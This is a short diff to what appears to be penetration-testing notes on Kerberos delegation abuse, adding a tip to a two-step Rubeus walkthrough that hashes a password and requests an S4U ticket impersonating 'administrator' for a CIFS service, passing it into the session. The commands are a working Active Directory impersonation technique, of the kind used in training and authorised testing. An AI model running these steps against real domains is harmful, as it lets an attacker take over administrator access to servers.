@@ -39,3 +39,5 @@ NOW WE WILL REQUEST A TGS FOR THE SPN: "CIFS/appsrv01.prod.corp1.com" USING RUBE
  1. `.\Rubeus.exe hash /password:h4x`
 	
  2. `.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.contoso.com /ptt`
+
+(the msdsspn parameter can be somewhat tricky, so do you can try various SPNs, for example if CIFS/appsrv01.contoso.com didn't worked, you can try CIFS/appsrv01 or something like that). 
